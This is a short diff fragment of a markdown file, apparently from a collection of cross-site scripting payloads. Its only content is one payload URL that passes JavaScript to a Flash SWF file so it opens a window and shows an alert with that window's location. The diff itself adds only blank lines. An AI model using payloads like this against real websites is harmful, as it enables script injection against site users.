@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:21:40.578602+00:00'
 ```bash
 http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
 ```
+
+
